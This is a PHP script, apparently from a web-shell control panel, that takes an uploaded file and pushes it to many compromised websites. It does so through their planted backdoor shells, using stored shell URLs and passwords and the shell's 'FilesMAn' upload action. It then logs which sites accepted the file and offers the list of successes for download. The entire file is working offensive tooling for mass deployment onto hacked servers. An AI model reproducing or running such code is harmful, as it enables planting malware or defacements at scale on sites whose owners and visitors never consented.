<?
include('init.php');

if(isset($_POST['id']) && is_array($_POST['id'])){

   if(is_uploaded_file($_FILES['uploadfiletoshell']['tmp_name'])){
      $uploaddir = './temp/';
      $uploadfiletoshell = $uploaddir.basename($_FILES['uploadfiletoshell']['name']);
      move_uploaded_file($_FILES['uploadfiletoshell']['tmp_name'], $uploadfiletoshell);
      
	  $id = $_POST['id'];
	  $filename = basename($_FILES['uploadfiletoshell']['name']);
	  
	  foreach($id as $num){
          $url = $database[$num]['url'];
		  $pass = $database[$num]['pass'];
          $path = get_path($url,$pass);
		  
          $postdata =array(
					'pass' => $pass,
					'a' => 'FilesMAn',
					'c'=>$path,
					'p1' => 'uploadFile',
					'f'=>"@".getcwd().$uploadfiletoshell
				
			);
			
		 # print_r($postdata);exit;
          if(!empty($path)){
             file_upload($url,$postdata,$filename);
             $pos=strrpos($url,'/');
             $sub=substr($url,$pos+1);
             $url=str_replace($sub,$filename,$url);

             file_put_contents('dreport/good['.date("d.m.y").'].txt',$url."\r\n",FILE_APPEND);
             }
		  else{
             file_put_contents('dreport/bad['.date("d.m.y").'].txt',$url."\r\n",FILE_APPEND);
             continue;
             }
          
}
$file = 'dreport/good['.date("d.m.y").'].txt';
header ("Content-Type: application/octet-stream");
header ("Accept-Ranges: bytes");
header ("Content-Length: ".filesize($file));
header ("Content-Disposition: attachment; filename=".$file);  
readfile($file);
}
else{
   exit('Cant Upload File.Please Chmod 777 "temp" dir');
   }
   
     }
	  
   
#Functions
function file_upload($url,$postdata,$filename){
$host=parse_url($url);
$ch = curl_init();  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_URL, $url);  
curl_setopt($ch, CURLOPT_POST,1);  
curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);  
curl_exec($ch);
}


function get_path($url,$pass){
$opts = array('http' =>
		array(
			'method'  => 'POST',
			'proxy' => (defined('PROXY'))?('tcp://' . PROXY):null,
			'user_agent'=>USER_AGENT,
			'header'  => 'Content-type: application/x-www-form-urlencoded',
			'content' => http_build_query(
				array(
					'pass' => $pass,
				)
		)));
	$context  = stream_context_create($opts);
	preg_match('#(?<=name\=c value\=\').*(?=\'\>)#i',@file_get_contents($url, false, $context),$matches);			
	return $matches[0];		
			
}



?>